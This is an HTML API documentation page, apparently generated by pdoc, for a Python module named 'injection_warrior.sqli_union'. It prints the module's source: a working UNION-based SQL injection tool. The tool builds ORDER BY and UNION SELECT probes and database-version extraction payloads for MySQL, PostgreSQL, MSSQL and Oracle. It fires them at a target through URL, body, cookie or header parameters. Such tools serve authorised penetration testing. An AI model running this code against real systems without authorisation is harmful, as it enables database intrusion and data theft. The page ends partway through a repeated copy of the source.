<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
<meta name="generator" content="pdoc 0.9.1" />
<title>injection_warrior.sqli_union API documentation</title>
<meta name="description" content="" />
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>injection_warrior.sqli_union</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from injection_warrior import warrior

# Author h0rac

import hashlib
import requests
import sys
import itertools
from bs4 import BeautifulSoup
import aiohttp
import sys
import asyncio
import time
import hashlib
import requests
import zipfile
from bs4 import BeautifulSoup
from termcolor import colored
import re

sqli_payloads = {
    &#34;version_detection&#34;: {
        &#34;mysql&#34;: &#34;@@version&#34;,
        &#34;postgreSQL&#34;: &#34;version()&#34;,
        &#34;microsoftSQL&#34;: &#34;@@version&#34;,
        &#34;oracle&#34;: [&#34;banner[DELIMITER]FROM[DELIMITER]v$version&#34;, &#34;version[DELIMITER]FROM[DELIMITER]v$instance&#34;]
    }
}


class SQLiUnion(warrior.Injector):

    def __init__(self, proxy=None, debug=False):
        super().__init__(proxy, debug)
        &#34;&#34;&#34;SQLiUnion constructor

        Args:
            proxy ([type], optional): [description]. Defaults to None.
            debug (bool, optional): [description]. Defaults to False.
        &#34;&#34;&#34;
        self.proxy = proxy
        self.debug = debug
        self.url = &#34;&#34;
        self.http_method=&#34;&#34;
        self.req_json = False
        self.resp_json = False

    # START Base methods

    def _url_path_parse(self, url=&#34;&#34;, payloads=[]):
        return super(SQLiUnion, self)._url_path_parse(url=url, payloads=payloads)

    def _run(self, http_method=&#34;get&#34;, urls=[], html=False, injection_point=&#34;url&#34;, body_params={}, req_json=False, resp_json=False, cookie_params={}, url_params={}, header_params={}):
        return super(SQLiUnion, self)._run(http_method, urls, html, injection_point, body_params, req_json, resp_json, cookie_params, url_params, header_params)

    def _params_converted(self, payloads=[], params={}):
        return super(SQLiUnion, self)._params_converted(payloads=payloads, params=params)

    # END Base methods

    def __gen_order_by(self, columns=1, comment=&#39;--&#39;, delimiter=&#34;+&#34;, cookie=False, quote=&#34;&#39;&#34;, param_value=&#34;test&#34;):
        payloads = []
        for i in (128, 64, 32, 16, 8, 4, 2, 1):
            if columns &gt;= i:
                if cookie:
                    payloads.append(&#34;{}{}{}ORDER{}BY{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
                else:
                    payloads.append(&#34;{}{}{}ORDER{}BY{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
                columns = columns-i
            else:
                if cookie:
                    payloads.append(&#34;{}{}{}ORDER{}BY{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
                else:
                    payloads.append(&#34;{}{}{}ORDER{}BY{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, i, comment, delimiter))
        return payloads

    def __gen_nulls(self, columns=1, comment=&#34;--&#34;, delimiter=&#34;+&#34;, oracle=False, cookie=False, comma=&#34;,&#34;):
        query = &#34;{}UNION{}SELECT{}&#34;.format(delimiter, delimiter, delimiter)
        payload = &#39;&#39;
        if cookie:
            payload = &#34;%2cNULL&#34; * columns
        else:
            payload = &#34;{}NULL&#34;.format(comma) * columns
        if oracle:
            payload = query + payload + delimiter+&#34;FROM&#34;+delimiter+&#34;DUAL&#34;+comment+delimiter
        else:
            payload = query + payload + comment+delimiter
        if not cookie:
            payload = payload.replace(comma, &#39;&#39;, 1)
        else:
            payload = payload.replace(&#39;%2c&#39;, &#39;&#39;, 1)
        return payload

    def union_find_columns_number(self, http_method=&#34;get&#34;, url=&#34;&#34;, columns=1, injection_method=&#34;null&#34;, html=False, injection_point=&#34;url&#34;, url_params={}, body_params={}, cookie_params={}, header_params={}, param_value=&#34;test&#34;, req_json=False, resp_json=False, **kwargs):
        
        &#34;&#34;&#34;method allows to find number of columns for SQL Union based injection

        Args:
            url (str): [URL for endpoint]. Defaults to &#34;&#34;.
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
            injection_method (str, optional): [NULL based or ORDER BY injection method]. Defaults to &#34;null&#34;.
            columns (int, optional): [Number of columns]. Defaults to 1.
            param_value (int, optional): [Optional string prefixed before payload]. Defaults to &#34;test&#34;.
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
            kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        &#34;&#34;&#34;
        self.resp_json = resp_json
        self.req_json = req_json
        self.html = html
        self.url = url
        self.http_method = http_method
        http_method = http_method.lower()
        body_params_list = []
        
        quote = kwargs.get(&#39;quote&#39;) if kwargs.get(&#39;quote&#39;) != None else &#34;&#39;&#34;
        comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;
        delimiter = kwargs.get(&#39;delimiter&#39;) if kwargs.get(&#39;delimiter&#39;) != None else &#34;+&#34;
        comment = kwargs.get(&#39;comment&#39;) if kwargs.get(&#39;comment&#39;) != None else &#34;--&#34;
        oracle = kwargs.get(&#39;oracle&#39;) if kwargs.get(&#39;columns&#39;) != None else False

        urls = [url]
        
        if self.debug:
            print(colored(
                &#39;&#39;&#39;[+] UNION attack &#39;FIND COLUMNS NUMBER&#39;selected parameters: 
            HTTP METHOD: {}
            URL: {}
            GUESTED COLUMNS: {}
            INJECTION METHOD: {}
            DBMS ORACLE: {}
            RETURN HTML: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            COOKIE PARAMS: {}
            HEADER PARAMS: {}
            URL PARAMS: {}
            URL PARAM VALUE: {}
            REQ JSON: {}
            RESP JSON: {}
            KWAGRS: {}
            &#39;&#39;&#39;.format(http_method, url, columns, injection_method, html, injection_point, body_params, cookie_params, header_params, url_params, param_value, req_json, resp_json, kwargs), &#34;yellow&#34;))
        # START SECTION URL INJECTION
        if injection_method == &#34;null&#34; and injection_point == &#34;url&#34;:
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle)
                payloads.append(param_value+quote+payload)
            url_params_list = self._params_converted(payloads=payloads, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, url_params=url_params_list, injection_point=injection_point, cookie_params=cookie_params)

        elif injection_method == &#34;order_by&#34; and injection_point == &#34;url&#34;:
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, param_value=param_value)
            url_params_list = self._params_converted(payloads=payloads, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, url_params=url_params_list, injection_point=injection_point, cookie_params=cookie_params)

        # END SECTION URL INJECTION

        # START SECTION BODY INJECTION

        elif injection_method == &#34;null&#34; and injection_point == &#34;body&#34;:
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle)
                p = quote + payload
                payloads.append(p)
            body_params_list = self._params_converted(payloads=payloads, params=body_params)
            return self._run(http_method=http_method, urls=url, html=html, injection_point=injection_point, body_params=body_params_list, req_json=req_json, resp_json=resp_json, cookie_params=cookie_params)

        elif injection_method == &#34;order_by&#34; and injection_point == &#34;body&#34;:
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, param_value=param_value)
            body_params_list = self._params_converted(payloads=payloads, params=body_params)
            return self._run(http_method=http_method, urls=url, html=html, injection_point=injection_point, body_params=body_params_list, req_json=req_json, resp_json=resp_json, cookie_params=cookie_params)

        # END SECTION BODY INJECTION

        # START SECTION COOKIE INJECTION

        elif injection_method == &#34;null&#34; and injection_point == &#34;cookie&#34;:
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle, cookie=True)
                p = quote + payload
                payloads.append(p)
            cookie_param_list = self._params_converted(payloads=payloads, params=cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_param_list,req_json=req_json, resp_json=resp_json,  body_params=body_params)

        elif injection_method == &#34;order_by&#34; and injection_point == &#34;cookie&#34;:
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, cookie=True, quote=quote, param_value=param_value)
            cookie_param_list = self._params_converted(payloads=payloads, params=cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_param_list, body_params=body_params, req_json=req_json, resp_json=resp_json)

        # END SECTION COOKIE INJECTION

        # START SECTION HEADER INJECTION

        elif injection_method == &#34;null&#34; and injection_point == &#34;header&#34;:
            payloads = []
            for i in range(1, columns):
                payload = self.__gen_nulls(
                    columns=i, comment=comment, delimiter=delimiter, oracle=oracle, cookie=False)
                p = param_value+quote + payload
                payloads.append(p)
            header_params_list = self._params_converted(payloads=payloads, params=header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, req_json=req_json, resp_json=resp_json, header_params=header_params_list, body_params=body_params)

        elif injection_method == &#34;order_by&#34; and injection_point == &#34;header&#34;:
            payloads = self.__gen_order_by(
                columns=columns, comment=comment, delimiter=delimiter, cookie=False, quote=quote, param_value=param_value)
            header_params_list = self._params_converted(payloads=payloads, params=header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=body_params, header_params=header_params_list,req_json=req_json, resp_json=resp_json)

        # END SECTION HEADER INJECTION

    def union_find_string_in_columns(self, url=&#34;&#34;, string=&#34;abcd&#34;, http_method=&#34;get&#34;, html=False, 
                                     injection_point=&#34;url&#34;, body_params={}, url_params={}, 
                                     header_params={}, param_value=&#34;test&#34;, req_json=False, 
                                     resp_json=False, cookie_params={}, columns=1, **kwargs):
        &#34;&#34;&#34;method allows to find selected string in generated columns payload for SQL Union based injection

        Args:
            url (str): [URL for endpoint]. Defaults to &#34;&#34;.
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
            string (str, optional): [String to search in columns]. Defaults to &#34;abcd&#34;.
            columns (int, optional): [Number of columns]. Defaults to 1.
            param_value (int, optional): [Optional string prefixed before payload]. Defaults to &#34;test&#34;.
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
            kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        &#34;&#34;&#34;
        self.resp_json = resp_json
        self.req_json = req_json
        self.html = html
        self.url = url
        self.http_method = http_method
        http_method = http_method.lower()
        
        quote = kwargs.get(&#39;quote&#39;) if kwargs.get(&#39;quote&#39;) != None else &#34;&#39;&#34;
        comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;
        delimiter = kwargs.get(&#39;delimiter&#39;) if kwargs.get(&#39;delimiter&#39;) != None else &#34;+&#34;
        comment = kwargs.get(&#39;comment&#39;) if kwargs.get(&#39;comment&#39;) != None else &#34;--&#34;
        oracle = kwargs.get(&#39;oracle&#39;) if kwargs.get(&#39;columns&#39;) != None else False
        urls = [url]
        
        params_list = []
        if self.debug:
            print(colored(
                &#39;&#39;&#39;[+] UNION attack &#39;FIND STRING IN COLUMNS&#39; selected parameters: 
            HTTP METHOD: {}
            URL: {}
            RETURN HTML: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            COOKIE PARAMS: {}
            URL PARAMS: {}
            HEADER PARAMS: {}
            REQ JSON: {}
            RESP JSON: {}
            KWARGS: {}
            &#39;&#39;&#39;.format(http_method, url, html, injection_point, body_params, cookie_params, url_params, header_params, req_json, resp_json, kwargs), &#34;yellow&#34;))
        string = &#34;{}{}{}&#34;.format(quote, string, quote)
        if injection_point == &#34;url&#34;:
            payloads = []
            temp = &#39;&#39;
            nulls = [&#34;NULL&#34; for x in range(columns)]
            for i in range(0, len(nulls)):
                if nulls[i] == &#34;NULL&#34;:
                    nulls[i] = string
                    p = &#39;{}&#39;.format(comma).join(nulls)
                    if oracle:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    payloads.append(payload)
                nulls[i] = &#34;NULL&#34;
            url_params_list = self._params_converted(payloads=payloads, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, url_params=url_params_list, cookie_params=cookie_params, body_params=params_list, req_json=req_json, resp_json=resp_json)
        elif injection_point == &#34;body&#34;:
            payloads = []
            temp = &#39;&#39;
            nulls = [&#34;NULL&#34; for x in range(columns)]
            for i in range(0, len(nulls)):
                if nulls[i] == &#34;NULL&#34;:
                    nulls[i] = string
                    p = &#39;{}&#39;.format(comma).join(nulls)
                    if oracle:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    temp += payload
                nulls[i] = &#34;NULL&#34;
                payloads.append(temp)
            params_list = self._params_converted(payloads=payloads, params=body_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=params_list, req_json=req_json, resp_json=resp_json)

        elif injection_point == &#34;cookie&#34;:
            payloads = []
            nulls = [&#34;NULL&#34; for x in range(columns)]
            temp = &#39;&#39;
            for i in range(0, len(nulls)):
                if nulls[i] == &#34;NULL&#34;:
                    nulls[i] = string
                    p = &#39;%2c&#39;.join(nulls)
                    if oracle:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    temp += payload
                nulls[i] = &#34;NULL&#34;
                payloads.append(temp)
            cookie_params_list = self._params_converted(payloads, cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params_list, body_params=body_params, req_json=req_json, resp_json=resp_json)

        elif injection_point == &#34;header&#34;:
            payloads = []
            temp = &#39;&#39;
            nulls = [&#34;NULL&#34; for x in range(columns)]
            for i in range(0, len(nulls)):
                if nulls[i] == &#34;NULL&#34;:
                    nulls[i] = string
                    p = &#39;{}&#39;.format(quote).join(nulls)
                    if oracle:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                    else:
                        payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                            param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                    temp += payload
                nulls[i] = &#34;NULL&#34;
                payloads.append(temp)
            header_params_list = self._params_converted(payloads, header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=body_params, header_params=header_params_list, req_json=req_json, resp_json=resp_json)

    def union_identify_database_version(self, url=&#34;&#34;, http_method=&#34;get&#34;, dbms=&#34;mysql&#34;, oracle=False, payloads=[], 
                                        injection_point=&#34;url&#34;,  body_params={}, req_json=False, resp_json=False, html=None, 
                                        cookie_params={}, url_params={}, string=&#39;test1234&#39;, header_params={}, **kwargs):
        
        &#34;&#34;&#34;method allows to identify database version for SQL Union based injection attack

        Args:
            url (str): [URL for endpoint]. Defaults to &#34;&#34;.
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
            string (str, optional): [String to search in columns]. Defaults to &#34;abcd&#34;.
            dbms (str, optional): [DBMS type for which to generate payloads]. Defaults to &#34;abcd&#34;.
            param_value (int, optional): [Optional string prefixed before payload]. Defaults to &#34;test&#34;.
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
            kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        &#34;&#34;&#34;
        if oracle:
            dbms = &#34;oracle&#34;
        if dbms == &#34;&#34;:
            print(colored(&#34;[-] Empty dbms not supported&#34;, &#34;red&#34;))
            sys.exit(0)
        if (dbms == &#34;mysql&#34; and oracle) or (dbms == &#34;postgreSQL&#34; and oracle) or (dbms == &#34;microsoftSQL&#34; and oracle):
            print(colored(
                &#34;[-] Not supported combination for dbms:&#39;{}&#39; and oracle: &#39;{}&#39; &#34;.format(dbms, oracle), &#34;red&#34;))
            sys.exit(0)
            
        quote = kwargs.get(&#39;quote&#39;) if kwargs.get(&#39;quote&#39;) != None else &#34;&#39;&#34;
        comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;
        self.resp_json = resp_json
        self.req_json = req_json
        self.html = html
        self.url = url
        self.http_method = http_method
        http_method = http_method.lower()
        
        urls= [url]
        
        if self.debug:
            print(colored(
                &#39;&#39;&#39;[+] UNION attack &#39;IDENTIFY DATABSE&#39; selected parameters: 
            URL: {}
            HTTP METHOD: {}
            DBMS: {}
            ORACLE: {}
            ORIGINAL PAYLOAD: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            REQ JSON: {}
            RESP JSON: {}
            RETURN HTML: {}
            COOKIE PARAMS: {}
            URL PARAMS: {}
            BODY PARAMS: {}
            HEADER PARAMS: {}
            STRING TO REPLACE: {}
            PARAM VALUE: {}
            DELIMITER: {}
            KWARGS: {}
            &#39;&#39;&#39;.format(url, http_method, dbms, oracle, payloads, injection_point,  body_params, req_json, resp_json, html, cookie_params, url_params, body_params, header_params, string, kwargs), &#34;yellow&#34;))

        version = sqli_payloads.get(&#39;version_detection&#39;).get(dbms)
        payloads_list = []
        i = 0
        temp = &#39;&#39;
        p = &#39;&#39;
        if oracle:
            for p in payloads:
                p = p.replace(&#34;,NULL&#34;, &#34;&#34;)
                p = p.replace(&#34;FROM DUAL-- &#34;, &#34;&#34;)
            for v in version:
                i += 1
                temp = p.replace(quote+string+quote, v)
                payloads_list.append(temp)
            print(
                colored(&#34;[+] Datbase version payloads: {}&#34;.format(payloads_list), &#34;yellow&#34;))
        else:
            for p in payloads:
                p = re.sub(&#39;,&#39;, comma, p)
                i += 1
                p = p.replace(quote+string+quote, version)
                payloads_list.append(p)
            print(
                colored(&#34;[+] Datbase version payloads: {}&#34;.format(payloads_list), &#34;yellow&#34;))
        if injection_point == &#34;url&#34;:
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                url_params_list = self._params_converted(payloads=values, params=url_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                url_params_list = self._params_converted(payloads=values, params=url_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params_list, header_params=header_params, body_params=body_params, req_json=req_json, resp_json=resp_json)

        elif injection_point == &#34;body&#34;:
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                body_params_list = self._params_converted(payloads=values, params=body_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                body_params_list = self._params_converted(payloads=values, params=body_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params, header_params=header_params, body_params=body_params_list, req_json=req_json, resp_json=resp_json)

        elif injection_point == &#34;header&#34;:
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                header_params_list = self._params_converted(
                    payloads=values, params=header_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                header_params_list = self._params_converted(payloads=values, params=header_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params, body_params=body_params, header_params=header_params_list,req_json=req_json, resp_json=resp_json)

        elif injection_point == &#34;cookie&#34;:
            if oracle:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                cookie_params_list = self._params_converted(
                    payloads=values, params=cookie_params)
            else:
                values = self._parse_template(payloads=payloads_list, **kwargs)
                cookie_params_list = self._params_converted(
                    payloads=values, params=cookie_params)
            return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params_list, url_params=url_params, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json)</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="injection_warrior.sqli_union.SQLiUnion"><code class="flex name class">
<span>class <span class="ident">SQLiUnion</span></span>
<span>(</span><span>proxy=None, debug=False)</span>
</code></dt>
<dd>
<div class="desc"><p>Main class of the framework</p>
<p>AI is creating summary for <strong>init</strong></p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>proxy</code></strong> :&ensp;<code>[type]</code>, optional</dt>
<dd>[description]. Defaults to None.</dd>
<dt><strong><code>debug</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[description]. Defaults to False.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class SQLiUnion(warrior.Injector):

    def __init__(self, proxy=None, debug=False):
        super().__init__(proxy, debug)
        &#34;&#34;&#34;SQLiUnion constructor

        Args:
            proxy ([type], optional): [description]. Defaults to None.
            debug (bool, optional): [description]. Defaults to False.
        &#34;&#34;&#34;
        self.proxy = proxy
        self.debug = debug
        self.url = &#34;&#34;
        self.http_method=&#34;&#34;
        self.req_json = False
        self.resp_json = False

    # START Base methods

    def _url_path_parse(self, url=&#34;&#34;, payloads=[]):
        return super(SQLiUnion, self)._url_path_parse(url=url, payloads=payloads)

